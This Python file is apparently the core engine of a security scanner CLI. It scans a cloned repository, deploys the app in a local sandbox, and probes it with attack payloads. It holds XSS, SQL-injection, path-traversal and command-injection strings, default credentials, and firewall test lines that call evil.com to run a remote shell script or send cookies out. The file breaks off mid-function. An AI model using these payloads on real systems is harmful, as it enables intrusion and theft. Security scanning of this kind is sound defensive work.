"""
CYPHEX CLI Engine - Core logic for scan, patch, push workflow.
"""
import asyncio
import os
import sys
import shutil
import subprocess
import time
import uuid
import json
import re
import glob
import random
from datetime import datetime
from typing import Any, Optional
import httpx

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "backend", "backend"))

from sandbox_manager import deploy_sandbox, stop_sandbox, _find_free_port, _get_node_env
from immune.behavioral_genome import BehavioralGenome
from immune.mutation_engine import MutationEngine
from immune.evolution_controller import EvolutionController
from models.scan import ScanContext, FormData, ParamData, Vuln

class C:
    R="\033[91m";G="\033[92m";Y="\033[93m";B="\033[94m"
    M="\033[95m";CY="\033[96m";W="\033[97m";BOLD="\033[1m"
    DIM="\033[2m";RST="\033[0m"

WORK_DIR = os.path.join(os.path.dirname(__file__), "backend", "sandboxes")
os.makedirs(WORK_DIR, exist_ok=True)


class CyphexEngine:
    def __init__(self):
        self.scan_id = f"cli_{uuid.uuid4().hex[:8]}"
        self.source_dir = None
        self.sandbox_info = None
        self.context = None
        self.vulns = []
        self.genome = None
        self.repo_url = None
        self._static_proc = None
        self.judge_mode = False
        self.non_interactive = False
        self.start_ts = 0.0

    async def run(self, repo_url=None, local_path=None, branch="main",
                  generations=10, output_file=None, auto_patch=True,
                  judge_mode=False, non_interactive=False):
        self.start_ts = time.time()
        self.repo_url = repo_url
        self.judge_mode = judge_mode
        self.non_interactive = non_interactive

        if self.judge_mode:
            random.seed(1337)
            generations = min(generations, 4)
            auto_patch = False

        # Step 1: Get source code
        self._step("1/8", "GETTING SOURCE CODE")
        self.source_dir = await self._get_source(repo_url, local_path, branch)
        if not self.source_dir:
            return

        # Step 2: Analyze code files
        self._step("2/8", "STATIC CODE ANALYSIS")
        file_vulns = self._analyze_code_files(self.source_dir)

        # Step 3: Deploy sandbox
        self._step("3/8", "DEPLOYING SANDBOX")
        target_url = await self._deploy(self.source_dir)
        if not target_url:
            return

        # Step 4: Dynamic scan (crawl + attack)
        self._step("4/8", "DYNAMIC VULNERABILITY SCAN")
        self.context = await self._dynamic_scan(target_url)
        self.context.confirmed_vulns.extend(file_vulns)

        # Step 5: Build genome + evolve
        self._step("5/8", "IMMUNE SYSTEM - BUILD GENOME")
        self.genome = await self._build_and_evolve(self.context, generations)

        # Step 6: AI Attack Simulation
        self._step("6/8", "AI ATTACK SIMULATION - GENOME DEFENSE")
        self._simulate_attacks()

        # Step 7: Report
        self._step("7/8", "SECURITY REPORT")
        report = self._print_report(time.time() - self.start_ts)
        if output_file:
            self._save_report(report, output_file)
        if self.judge_mode:
            self._save_judge_artifacts(report)

        # Step 8: Patch workflow
        if auto_patch and self.context.confirmed_vulns:
            self._step("8/8", "PATCH & VERIFY")
            await self._patch_workflow()

        # Cleanup
        if self._static_proc:
            self._static_proc.terminate()
            print(f"\n  {C.G}[OK]{C.RST} Static server stopped.")
        elif self.sandbox_info:
            stop_sandbox(self.sandbox_info.get("sandbox_id", ""))
            print(f"\n  {C.G}[OK]{C.RST} Sandbox stopped.")

        self._final_banner()

    def doctor(self) -> bool:
        """
        Local readiness check for judge/demo environments.
        Returns True when all required checks pass.
        """
        checks = []
        checks.append(("python", sys.version.split()[0], True))
        checks.append(("platform", os.name, True))

        def _cmd_ok(cmd: list[str]) -> tuple[bool, str]:
            try:
                p = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
                if p.returncode == 0:
                    return True, (p.stdout.strip() or p.stderr.strip() or "ok")
                return False, (p.stderr.strip() or p.stdout.strip() or "failed")
            except Exception as exc:
                return False, str(exc)

        npm_bin = "npm.cmd" if os.name == "nt" else "npm"
        tool_cmds = [
            ("git", ["git", "--version"]),
            ("node", ["node", "--version"]),
            ("npm", [npm_bin, "--version"]),
            ("curl", ["curl", "--version"]),
            ("ollama", ["ollama", "--version"]),
        ]
        for name, cmd in tool_cmds:
            ok, detail = _cmd_ok(cmd)
            checks.append((name, detail.splitlines()[0][:80], ok))

        ollama_ok = False
        ollama_detail = "not checked"
        try:
            r = httpx.get("http://localhost:11434/api/tags", timeout=4.0)
            ollama_ok = r.status_code == 200
            if ollama_ok:
                models = [m.get("name", "") for m in r.json().get("models", [])]
                ollama_detail = ", ".join(models[:3]) if models else "no models pulled"
            else:
                ollama_detail = f"status={r.status_code}"
        except Exception as exc:
            ollama_detail = str(exc)[:80]
        checks.append(("ollama-api", ollama_detail, ollama_ok))

        print(f"{C.CY}{'='*60}{C.RST}")
        print(f"  {C.BOLD}CYPHEX Doctor - Local Readiness{C.RST}")
        print(f"{C.CY}{'='*60}{C.RST}")
        all_ok = True
        for name, detail, ok in checks:
            mark = f"{C.G}[OK]{C.RST}" if ok else f"{C.R}[!!]{C.RST}"
            print(f"  {mark} {name:<12} {detail}")
            all_ok = all_ok and ok

        if all_ok:
            print(f"\n  Result: {C.G}READY{C.RST}")
        else:
            print(f"\n  Result: {C.Y}PARTIAL - fix failed checks before demo{C.RST}")
        return all_ok

    def _step(self, num, title):
        elapsed = time.time() - self.start_ts if self.start_ts else 0.0
        mode = "JUDGE" if self.judge_mode else "INTERACTIVE"
        print(f"\n{C.CY}{'='*60}{C.RST}")
        print(f"  [{num}]  {C.BOLD}{title}{C.RST}  {C.DIM}[mode={mode} t={elapsed:.1f}s]{C.RST}")
        print(f"{C.CY}{'='*60}{C.RST}\n")

    # Step 1: Clone or copy source
    async def _get_source(self, repo_url, local_path, branch):
        dest = os.path.join(WORK_DIR, self.scan_id)
        os.makedirs(dest, exist_ok=True)

        if repo_url:
            print(f"  Cloning {C.CY}{repo_url}{C.RST} (branch: {branch})")
            try:
                proc = subprocess.run(
                    ["git", "clone", "--depth", "1", "-b", branch, repo_url, dest],
                    capture_output=True, text=True, timeout=120
                )
                if proc.returncode != 0:
                    # Try without branch
                    proc = subprocess.run(
                        ["git", "clone", "--depth", "1", repo_url, dest],
                        capture_output=True, text=True, timeout=120
                    )
                if proc.returncode != 0:
                    print(f"  {C.R}[ERR]{C.RST} Git clone failed: {proc.stderr[:200]}")
                    return None
                print(f"  {C.G}[OK]{C.RST} Cloned to {dest}")
            except FileNotFoundError:
                print(f"  {C.R}[ERR]{C.RST} Git not found. Install git first.")
                return None
        elif local_path:
            src = os.path.abspath(local_path)
            print(f"  Copying {C.CY}{src}{C.RST}")
            if not os.path.isdir(src):
                print(f"  {C.R}[ERR]{C.RST} Path not found: {src}")
                return None
            shutil.copytree(src, dest, dirs_exist_ok=True)
            print(f"  {C.G}[OK]{C.RST} Copied to {dest}")

        # Detect framework
        fw = self._detect_framework(dest)
        print(f"  {C.BOLD}Framework:{C.RST}  {fw['name']}")
        print(f"  {C.BOLD}Entry:{C.RST}      {fw['entry'] or 'auto-detect'}")
        print(f"  {C.BOLD}Files:{C.RST}      {fw['file_count']} code files")
        return dest

    def _detect_framework(self, path):
        info = {"name": "Unknown", "entry": None, "file_count": 0}
        code_exts = {'.js','.ts','.py','.php','.go','.java','.rb','.html','.css'}
        for root, dirs, files in os.walk(path):
            dirs[:] = [d for d in dirs if d not in {'node_modules','.git','__pycache__','.venv','venv'}]
            for f in files:
                if os.path.splitext(f)[1] in code_exts:
                    info["file_count"] += 1

        if os.path.exists(os.path.join(path, "package.json")):
            try:
                with open(os.path.join(path, "package.json")) as f:
                    pkg = json.load(f)
                deps = {**pkg.get("dependencies",{}), **pkg.get("devDependencies",{})}
                if "express" in deps: info["name"] = "Node.js (Express)"
                elif "next" in deps: info["name"] = "Node.js (Next.js)"
                elif "fastify" in deps: info["name"] = "Node.js (Fastify)"
                else: info["name"] = "Node.js"
                info["entry"] = pkg.get("main", "")
            except: pass
        elif os.path.exists(os.path.join(path, "requirements.txt")):
            info["name"] = "Python (Flask/Django)"
        elif os.path.exists(os.path.join(path, "go.mod")):
            info["name"] = "Go"
        elif os.path.exists(os.path.join(path, "composer.json")):
            info["name"] = "PHP"
        return info

    # Step 2: Static code analysis
    def _analyze_code_files(self, source_dir):
        vulns = []
        patterns = {
            "SQL Injection": [
                (r'f"[^"]*\{[^}]*\}[^"]*(?:SELECT|INSERT|UPDATE|DELETE|WHERE)', "Python f-string SQL"),
                (r'f"SELECT.*\{', "Python f-string query"),
                (r"execute\s*\(\s*f['\"]", "execute() with f-string"),
                (r'(?:query|execute|raw)\s*\(\s*[`\'"].*\$\{.*\}.*(?:SELECT|INSERT|UPDATE|DELETE|WHERE)', "JS template SQL with user input"),
                (r"query\s*\(\s*[`'\"].*\+", "String concat in query"),
                (r"db\.execute\s*\(.*%s.*%.*\)", "% format SQL"),
            ],
            "XSS (Cross-Site Scripting)": [
                (r'innerHTML\s*=\s*(?![\'"\s]*$)', "innerHTML assignment with dynamic content"),
                (r'document\.write\s*\(', "document.write()"),
                (r'res\.send\s*\(.*\$\{.*req\.(query|body|params)', "Express res.send with user input"),
                (r'\.html\s*\(.*req\.(query|body|params)', "Express .html() with user input"),
                (r'render.*\$\{.*req\.(query|body|params)', "Render with unescaped input"),
            ],
            "Command Injection": [
                (r'exec\s*\(.*req\.(query|body|params)', "exec() with user input"),
                (r'child_process.*exec\s*\(.*\+', "child_process with concat"),
                (r'os\.system\s*\(.*\+', "os.system with concat"),
                (r'subprocess\.\w+\s*\(.*shell\s*=\s*True', "subprocess shell=True"),
            ],
            "Path Traversal": [
                (r'readFile.*req\.(query|body|params)', "readFile with user input"),
                (r'open\s*\(.*req\.(query|body|params)', "open() with user input"),
                (r'(?:readFile|createReadStream|access)\s*\(.*\+.*(?:req|params|query)', "File access with user input"),
            ],
            "Hardcoded Secrets": [
                (r'(?:password|secret|api_key|token)\s*=\s*["\'][^"\']{8,}', "Hardcoded credential"),
                (r'(?:MYSQL_ROOT_PASSWORD|DB_PASS)\s*[:=]\s*\S+', "Hardcoded DB password"),
            ],
            "Missing Auth": [
                (r'app\.(get|post|put|delete)\s*\(\s*["\']\/admin', "Admin route without auth middleware"),
            ],
        }

        scanned = 0
        code_exts = {'.js','.ts','.py','.php','.go','.java','.rb','.jsx','.tsx'}

        for root, dirs, files in os.walk(source_dir):
            dirs[:] = [d for d in dirs if d not in {'node_modules','.git','__pycache__','.venv','dist','build'}]
            for fname in files:
                ext = os.path.splitext(fname)[1]
                if ext not in code_exts:
                    continue
                filepath = os.path.join(root, fname)
                rel_path = os.path.relpath(filepath, source_dir)
                try:
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    lines = content.split('\n')
                except:
                    continue

                scanned += 1
                for vuln_type, pats in patterns.items():
                    for pat, desc in pats:
                        for i, line in enumerate(lines, 1):
                            if re.search(pat, line, re.IGNORECASE):
                                severity = "Critical" if "Injection" in vuln_type else "High"
                                v = Vuln(
                                    name=f"[STATIC] {vuln_type}",
                                    severity=severity,
                                    endpoint=f"{rel_path}:{i}",
                                    confirmed=False,
                                )
                                vulns.append(v)
                                print(f"  {C.R}[{severity:>8}]{C.RST} {vuln_type} in {C.CY}{rel_path}:{i}{C.RST}")
                                print(f"           {C.DIM}{desc}: {line.strip()[:80]}{C.RST}")
                                break  # One per pattern per file

        print(f"\n  {C.G}[OK]{C.RST} Scanned {scanned} code files, found {len(vulns)} static issues")
        return vulns

    # Step 3: Deploy sandbox
    async def _deploy(self, source_dir):
        import zipfile, tempfile
        zip_path = os.path.join(tempfile.gettempdir(), f"{self.scan_id}.zip")

        # Create zip from source
        print(f"  Creating sandbox package...")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(source_dir):
                dirs[:] = [d for d in dirs if d not in {'node_modules','.git','__pycache__','.venv'}]
                for f in files:
                    fp = os.path.join(root, f)
                    arcname = os.path.relpath(fp, source_dir)
                    zf.write(fp, arcname)

        print(f"  Deploying sandbox...")
        deploy_id = f"{self.scan_id}_run"
        result = await deploy_sandbox(zip_path, deploy_id)

        if "error" in result:
            # Try monorepo: look for server/ subfolder with package.json
            server_dir = None
            for sub in ['server', 'backend', 'api', 'app']:
                sub_path = os.path.join(source_dir, sub)
                if os.path.isdir(sub_path) and os.path.exists(os.path.join(sub_path, 'package.json')):
                    server_dir = sub_path
                    break

            if server_dir:
                print(f"  {C.Y}[INFO]{C.RST} Monorepo detected - found server at {os.path.basename(server_dir)}/")
                # Re-zip just the server dir
                import tempfile as tf2
                zip2 = os.path.join(tf2.gettempdir(), f"{self.scan_id}_srv.zip")
                with __import__('zipfile').ZipFile(zip2, 'w') as zf:
                    for root, dirs, files in os.walk(server_dir):
                        dirs[:] = [d for d in dirs if d not in {'node_modules','.git','__pycache__'}]
                        for f in files:
                            fp = os.path.join(root, f)
                            zf.write(fp, os.path.relpath(fp, server_dir))
                result = await deploy_sandbox(zip2, deploy_id)
                if "error" not in result:
                    self.sandbox_info = result
                else:
                    print(f"  {C.Y}[INFO]{C.RST} Server deploy failed, falling back to static...")
                    result = {"error": "fallback"}

            if "error" in result and not self.sandbox_info:
                # Fallback: static site
                has_html = any(
                    f.endswith('.html') for _, _, files in os.walk(source_dir)
                    for f in files
                )
                if has_html:
                    print(f"  {C.Y}[INFO]{C.RST} Serving as static site with Python HTTP server...")
                    port = _find_free_port()
                    proc = subprocess.Popen(
                        [sys.executable, "-m", "http.server", str(port)],
                        cwd=source_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    )
                    await asyncio.sleep(2)
                    if proc.poll() is not None:
                        print(f"  {C.R}[ERR]{C.RST} Static server failed to start")
                        return None
                    url = f"http://localhost:{port}"
                    self.sandbox_info = {
                        "sandbox_id": deploy_id, "port": port, "url": url,
                        "status": "running", "pid": proc.pid,
                    }
                    self._static_proc = proc
                else:
                    print(f"  {C.R}[ERR]{C.RST} {result['error'][:200]}")
                    return None
        else:
            self.sandbox_info = result

        url = self.sandbox_info.get("url", "")
        port = self.sandbox_info.get('port', '')
        print(f"  {C.G}[OK]{C.RST} Sandbox deployed successfully!")
        print(f"  {C.DIM}PID: {self.sandbox_info.get('pid')}, Port: {port}{C.RST}")
        print(f"")
        print(f"  {C.CY}+{'-' * 62}+{C.RST}")
        print(f"  {C.CY}|{C.RST}  {C.BOLD}SANDBOX LIVE AT:{C.RST}  {C.G}{url}{C.RST}")
        print(f"  {C.CY}|{C.RST}  {C.DIM}Open in browser to see the target app{C.RST}")
        print(f"  {C.CY}+{'-' * 62}+{C.RST}")
        return url

    # Step 4: Dynamic scan
    async def _dynamic_scan(self, target_url):
        """CLI-focused dynamic scan with explicit per-agent visibility."""
        context = ScanContext(target_url=target_url)

        def agent_header(agent_id: str, name: str, objective: str):
            print(f"\n  {C.CY}{'-' * 72}{C.RST}")
            print(f"  {C.BOLD}[{agent_id}] {name}{C.RST}")
            print(f"  {C.DIM}{objective}{C.RST}")
            print(f"  {C.CY}{'-' * 72}{C.RST}")

        def show_cmd(agent: str, cmd: str):
            print(f"  {C.DIM}[{agent}]$ {cmd}{C.RST}")

        async with httpx.AsyncClient(timeout=12, follow_redirects=True) as client:
            # Agent 02 - Crawler
            agent_header("Agent 02", "Crawler", "Discover pages, forms, parameters")
            pages = ["/"]
            discovered = set()
            forms_found = []

            while pages and len(discovered) < 30:
                path = pages.pop(0)
                if path in discovered:
                    continue
                discovered.add(path)
                url = f"{target_url}{path}"
                show_cmd("Crawler", f'curl -sL "{url}"')
                try:
                    resp = await client.get(url)
                except Exception as exc:
                    print(f"  {C.R}[Crawler][ERR]{C.RST} {path}: {str(exc)[:80]}")
                    continue

                body = resp.text
                context.all_endpoints.append(url)
                context.headers.update(dict(resp.headers))
                print(f"  {C.G}[Crawler]{C.RST} HTTP {resp.status_code} {url}")

                for link in re.findall(r'href=["\'](/[^"\']*)["\']', body, re.I):
                    clean = link.split("?")[0].split("#")[0]
                    if clean not in discovered and clean not in pages and len(pages) < 40:
                        pages.append(clean)

                form_matches = re.findall(r'<form[^>]*method=["\'](GET|POST)["\'][^>]*action=["\']([^"\']*)["\']', body, re.I)
                for method, action in form_matches:
                    section_start = body.find(f'action="{action}"')
                    section = body[section_start: section_start + 1500] if section_start >= 0 else body
                    inputs = re.findall(r'name=["\']([^"\']+)["\']', section, re.I)
                    full = f"{target_url}{action}" if action.startswith("/") else action
                    forms_found.append(FormData(action=full, method=method.upper(), inputs=inputs, page=path))
                    print(f"  {C.Y}[Crawler][FORM]{C.RST} {method.upper()} {full} inputs={inputs}")

            context.all_forms = forms_found
            print(f"\n  {C.G}[Crawler][OK]{C.RST} pages={len(context.all_endpoints)} forms={len(forms_found)}")

            # Agent 04 - XSS
            agent_header("Agent 04", "XSS", "Probe reflected XSS payload execution paths")
            xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
            seen_xss = set()
            for form in forms_found:
                form_key = form.action
                if form_key in seen_xss or not form.inputs:
                    continue
                for payload in xss_payloads:
                    if form.method == "GET":
                        q = "&".join([f"{inp}={payload}" for inp in form.inputs])
                        show_cmd("XSS", f'curl -s "{form.action}?{q}"')
                        resp = await client.get(form.action, params={inp: payload for inp in form.inputs})
                    else:
                        show_cmd("XSS", f'curl -s -X POST "{form.action}" -d "{form.inputs[0]}={payload}"')
                        resp = await client.post(form.action, data={inp: payload for inp in form.inputs})

                    reflected = payload in resp.text
                    print(f"  [XSS] payload={payload[:30]} reflected={'yes' if reflected else 'no'} status={resp.status_code}")
                    if reflected:
                        context.confirmed_vulns.append(Vuln(
                            name="[DYNAMIC] Reflected XSS",
                            severity="High",
                            endpoint=f"{form.action} ({form.inputs})",
                            payload=payload,
                            confirmed=True,
                        ))
                        print(f"  {C.R}[XSS][CONFIRMED]{C.RST} reflected payload at {form.action}")
                        seen_xss.add(form_key)
                        break

            # Agent 03 - SQLi
            agent_header("Agent 03", "Injection (SQLi)", "Probe SQL injection indicators")
            sqli_payloads = ["' OR '1'='1", "' UNION SELECT NULL--"]
            sql_errors = ["sql", "syntax error", "sqlite", "mysql", "postgres"]
            seen_sqli = set()
            for form in forms_found:
                if not form.inputs or form.action in seen_sqli:
                    continue
                for payload in sqli_payloads:
                    if form.method == "GET":
                        q = "&".join([f"{inp}={payload}" for inp in form.inputs])
                        show_cmd("SQLi", f'curl -s "{form.action}?{q}"')
                        resp = await client.get(form.action, params={inp: payload for inp in form.inputs})
                    else:
                        show_cmd("SQLi", f'curl -s -X POST "{form.action}" -d "{form.inputs[0]}={payload}"')
                        resp = await client.post(form.action, data={inp: payload for inp in form.inputs})

                    lower = resp.text.lower()
                    indicator = any(e in lower for e in sql_errors) or payload.lower() in lower
                    print(f"  [SQLi] payload={payload[:30]} indicator={'yes' if indicator else 'no'} status={resp.status_code}")
                    if indicator:
                        context.confirmed_vulns.append(Vuln(
                            name="[DYNAMIC] SQL Injection Candidate",
                            severity="Critical",
                            endpoint=f"{form.action} ({form.inputs})",
                            payload=payload,
                            confirmed=True,
                        ))
                        print(f"  {C.R}[SQLi][CONFIRMED]{C.RST} exploit indicator at {form.action}")
                        seen_sqli.add(form.action)
                        break

            # Agent 05 - Auth
            agent_header("Agent 05", "Auth", "Try weak/default credential flows")
            default_creds = [("admin", "admin"), ("admin", "admin123")]
            login_forms = [f for f in forms_found if any("pass" in i.lower() for i in f.inputs)]
            for form in login_forms[:2]:
                user_field = next((i for i in form.inputs if i.lower() in ("username", "user", "email")), form.inputs[0])
                pass_field = next((i for i in form.inputs if "pass" in i.lower()), form.inputs[-1])
                for u, p in default_creds:
                    show_cmd("Auth", f'curl -s -X POST "{form.action}" -d "{user_field}={u}&{pass_field}={p}"')
                    resp = await client.post(form.action, data={user_field: u, pass_field: p})
                    lower = resp.text.lower()
                    success = any(k in lower for k in ("token", "welcome", "dashboard", "success"))
                    print(f"  [Auth] tried {u}:{p} success={'yes' if success else 'no'} status={resp.status_code}")
                    if success:
                        context.confirmed_vulns.append(Vuln(
                            name="[DYNAMIC] Default Credentials",
                            severity="Critical",
                            endpoint=form.action,
                            payload=f"{u}:{p}",
                            confirmed=True,
                        ))
                        break

            # Agent 07 - LFI
            agent_header("Agent 07", "LFI", "Try file traversal payloads")
            lfi_targets = ["/download?file=../../../etc/passwd", "/api/file?path=../../../etc/passwd"]
            for suffix in lfi_targets:
                full = f"{target_url}{suffix}"
                show_cmd("LFI", f'curl -s "{full}"')
                try:
                    resp = await client.get(full)
                except Exception:
                    continue
                hit = "root:x:0:0" in resp.text
                print(f"  [LFI] target={suffix} success={'yes' if hit else 'no'} status={resp.status_code}")
                if hit:
                    context.confirmed_vulns.append(Vuln(
                        name="[DYNAMIC] Local File Inclusion",
                        severity="Critical",
                        endpoint=full,
                        payload="../../../etc/passwd",
                        confirmed=True,
                    ))

            # Agent 06 - CMDi
            agent_header("Agent 06", "CMDi", "Probe command execution sinks")
            cmdi_targets = ["/api/ping?host=127.0.0.1;id", "/ping?host=127.0.0.1|whoami"]
            for suffix in cmdi_targets:
                full = f"{target_url}{suffix}"
                show_cmd("CMDi", f'curl -s "{full}"')
                try:
                    resp = await client.get(full)
                except Exception:
                    continue
                hit = any(k in resp.text.lower() for k in ("uid=", "gid=", "root", "www-data", "nt authority"))
                print(f"  [CMDi] target={suffix} success={'yes' if hit else 'no'} status={resp.status_code}")
                if hit:
                    context.confirmed_vulns.append(Vuln(
                        name="[DYNAMIC] Command Injection",
                        severity="Critical",
                        endpoint=full,
                        payload=suffix,
                        confirmed=True,
                    ))

            # Agent 08 - Logic/CORS
            agent_header("Agent 08", "Logic", "Check insecure CORS and basic authz gaps")
            show_cmd("Logic", f'curl -sI -H "Origin: https://evil.example" "{target_url}"')
            try:
                head = await client.get(target_url, headers={"Origin": "https://evil.example"})
                acao = head.headers.get("Access-Control-Allow-Origin", "")
                if acao in ("*", "https://evil.example"):
                    context.confirmed_vulns.append(Vuln(
                        name="[DYNAMIC] CORS Misconfiguration",
                        severity="High",
                        endpoint=target_url,
                        payload=f"ACAO={acao}",
                        confirmed=True,
                    ))
                    print(f"  {C.R}[Logic][CONFIRMED]{C.RST} ACAO={acao}")
                else:
                    print(f"  [Logic] ACAO={acao or 'not-set'}")
            except Exception:
                pass

            # Agent 11 - Supply chain quick check
            agent_header("Agent 11", "Supply Chain", "Check exposed dependency manifests")
            for manifest in ("/package.json", "/requirements.txt"):
                full = f"{target_url}{manifest}"
                show_cmd("SupplyChain", f'curl -s -o /dev/null -w "%{{http_code}}" "{full}"')
                try:
                    resp = await client.get(full)
                except Exception:
                    continue
                if resp.status_code == 200 and len(resp.text) > 20:
                    context.confirmed_vulns.append(Vuln(
                        name=f"[DYNAMIC] Exposed Manifest {manifest}",
                        severity="High",
                        endpoint=full,
                        confirmed=True,
                    ))
                    print(f"  {C.R}[SupplyChain][CONFIRMED]{C.RST} exposed {manifest}")
                else:
                    print(f"  [SupplyChain] {manifest} status={resp.status_code}")

            # Agent 01 - Recon summary
            agent_header("Agent 01", "Recon", "Fingerprint headers and tech hints")
            context.technologies = []
            server = context.headers.get("server") or context.headers.get("Server")
            if server:
                context.technologies.append(f"Server:{server}")
                print(f"  [Recon] Server: {server}")
            powered = context.headers.get("x-powered-by") or context.headers.get("X-Powered-By")
            if powered:
                context.technologies.append(f"X-Powered-By:{powered}")
                print(f"  [Recon] X-Powered-By: {powered}")

            print(f"\n  {C.G}[SCAN][OK]{C.RST} endpoints={len(context.all_endpoints)} forms={len(forms_found)} vulns={len(context.confirmed_vulns)}")

        return context

    async def _build_and_evolve(self, context, generations):
        genome = BehavioralGenome()
        genome.build_from_scan(context)
        print(f"  {C.G}[OK]{C.RST} Genome built: {len(genome.endpoint_profiles)} endpoints")

        controller = EvolutionController()
        results = await controller.run_evolution(context, generations=generations, payloads_per_gen=30)

        summary = controller.get_evolution_summary()
        print(f"\n  {C.BOLD}Evolution:{C.RST} {summary['initial_block_rate']:.0%} -> {C.G}{summary['final_block_rate']:.0%}{C.RST}")
        return controller.genome

    # Step 6: AI attack simulation
    def _simulate_attacks(self):
        if not self.genome:
            print(f"  {C.Y}[SKIP]{C.RST} No genome available")
            return

        attacks = [
            ("SQLi", "' OR 1=1--", "Login bypass"),
            ("SQLi", "' UNION SELECT username,password FROM users--", "Data exfiltration"),
            ("SQLi", "'; DROP TABLE users;--", "Table destruction"),
            ("XSS", "<script>document.cookie</script>", "Cookie steal"),
            ("XSS", "<img src=x onerror=fetch('evil.com/'+document.cookie)>", "Exfil via img"),
            ("CMDi", "; cat /etc/passwd", "Command injection"),
            ("CMDi", "$(curl evil.com/shell.sh|bash)", "Remote code exec"),
            ("LFI", "../../etc/passwd", "Path traversal"),
            ("RCE", "{{7*7}}", "Template injection"),
            ("Normal", "hello world", "Normal text"),
            ("Normal", "john.doe@email.com", "Valid email"),
            ("Normal", "How to reset my password?", "Support query"),
        ]

        print(f"  {C.M}{'-' * 58}{C.RST}")
        print(f"  {C.BOLD}Genome Firewall Simulation{C.RST}")
        print(f"  {C.DIM}Testing {len(attacks)} requests against trained genome.{C.RST}")
        print(f"  {C.M}{'-' * 58}{C.RST}\n")

        for attack_type, payload, desc in attacks:
            score = self.genome._heuristic_score(self.genome.extract_features(payload))
            is_blocked = score >= 0.5
            bar_len = int(score * 20)
            bar = f"{'#' * bar_len}{'.' * (20 - bar_len)}"

            if is_blocked:
                status = f"{C.R}BLOCKED{C.RST}"
                color = C.R
            else:
                status = f"{C.G}ALLOWED{C.RST}"
                color = C.G if attack_type == "Normal" else C.Y

            print(f"  {status} [{bar}] {score:.2f} [{color}{attack_type:>6}{C.RST}] {C.DIM}{payload[:50]}{C.RST}")
            print(f"           {C.DIM}-> {desc}{C.RST}")

        attack_count = sum(1 for t, _, _ in attacks if t != "Normal")
        normal_count = sum(1 for t, _, _ in attacks if t == "Normal")
        attacks_blocked = sum(1 for (t, p, _) in attacks if t != "Normal" and self.genome._heuristic_score(self.genome.extract_features(p)) >= 0.5)
        normals_allowed = sum(1 for (t, p, _) in attacks if t == "Normal" and self.genome._heuristic_score(self.genome.extract_features(p)) < 0.5)

        print(f"\n  {C.BOLD}{'-' * 50}{C.RST}")
        print(f"  {C.R}Attacks blocked:{C.RST}    {attacks_blocked}/{attack_count}")
        print(f"  {C.G}Normal allowed:{C.RST}     {normals_allowed}/{normal_count}")
        accuracy = ((attacks_blocked + normals_allowed) / len(attacks)) * 100
        print(f"  {C.BOLD}Genome accuracy:{C.RST}    {C.G}{accuracy:.0f}%{C.RST}")
        print(f"  {C.BOLD}False positives:{C.RST}    {normal_count - normals_allowed}")
        print(f"  {C.BOLD}False negatives:{C.RST}    {attack_count - attacks_blocked}")

    def _print_report(self, duration):
        vulns = self.context.confirmed_vulns
        crit = sum(1 for v in vulns if v.severity == "Critical")
        high = sum(1 for v in vulns if v.severity == "High")
        med = sum(1 for v in vulns if v.severity == "Medium")
        low = sum(1 for v in vulns if v.severity in ("Low", "Info"))

        total = len(vulns)
        score = max(0, 100 - crit * 25 - high * 10 - med * 5 - low)

        sc = C.G if score >= 80 else C.Y if score >= 50 else C.R
        bar = int(score / 100 * 30)

        print(f"\n  {C.BOLD}{'-' * 50}{C.RST}")
        print(f"  Security Score: {sc}{'#' * bar}{'.' * (30 - bar)} {score}/100{C.RST}")
        print(f"  {C.R}Critical: {crit}{C.RST}  {C.Y}High: {high}{C.RST}  {C.CY}Medium: {med}{C.RST}  {C.DIM}Low: {low}{C.RST}")
        print(f"  Scan time: {duration:.1f}s")
        print(f"  Scan id: {self.scan_id}")
        if self.sandbox_info:
            print(f"  Target: {self.sandbox_info.get('url', 'n/a')}")

        if vulns:
            print(f"\n  {C.BOLD}Vulnerabilities Found:{C.RST}")
            for i, v in enumerate(vulns, 1):
                scv = {"Critical": C.R, "High": C.Y, "Medium": C.CY}.get(v.severity, C.DIM)
                confidence = "high" if v.confirmed else "medium"
                print(f"  {i:3}. {scv}[{v.severity:>8}]{C.RST} confidence={confidence:<6} {v.name}")
                if v.endpoint:
                    print(f"       {C.DIM}at {v.endpoint[:70]}{C.RST}")
                if v.payload:
                    print(f"       {C.DIM}payload: {v.payload[:80]}{C.RST}")

        return {
            "scan_id": self.scan_id,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "score": score,
            "summary": {
                "critical": crit,
                "high": high,
                "medium": med,
                "low": low,
                "total_vulns": total,
                "duration_seconds": round(duration, 2),
            },
            "target": self.sandbox_info.get("url") if self.sandbox_info else None,
            "vulnerabilities": [
                {
                    "name": v.name,
                    "severity": v.severity,
                    "endpoint": v.endpoint,
                    "payload": v.payload,
                    "confirmed": v.confirmed,
                }
                for v in vulns
            ],
        }

    def _save_report(self, report, filepath):
        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"  {C.G}[OK]{C.RST} Report saved to {filepath}")

    def _save_judge_artifacts(self, report: dict):
        """Save deterministic judge artifacts in JSON, Markdown, and SARIF."""
        out_dir = os.path.join(self.source_dir or WORK_DIR, "cyphex_judge_artifacts")
        os.makedirs(out_dir, exist_ok=True)

        json_path = os.path.join(out_dir, "report.json")
        md_path = os.path.join(out_dir, "report.md")
        sarif_path = os.path.join(out_dir, "report.sarif")

        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)

        md_lines = [
            "# CYPHEX Judge Report",
            f"- Scan ID: `{report.get('scan_id')}`",
            f"- Score: `{report.get('score')}/100`",
            f"- Target: `{report.get('target')}`",
            f"- Duration: `{report.get('summary', {}).get('duration_seconds')}s`",
            "",
            "## Summary",
            f"- Critical: {report.get('summary', {}).get('critical', 0)}",
            f"- High: {report.get('summary', {}).get('high', 0)}",
            f"- Medium: {report.get('summary', {}).get('medium', 0)}",
            f"- Low: {report.get('summary', {}).get('low', 0)}",
            "",
            "## Findings",
        ]
        for v in report.get("vulnerabilities", []):
            md_lines.append(f"- **{v.get('severity')}** {v.get('name')} @ `{v.get('endpoint')}`")
        with open(md_path, "w", encoding="utf-8") as f:
            f.write("\n".join(md_lines) + "\n")

        results = []
        for v in report.get("vulnerabilities", []):
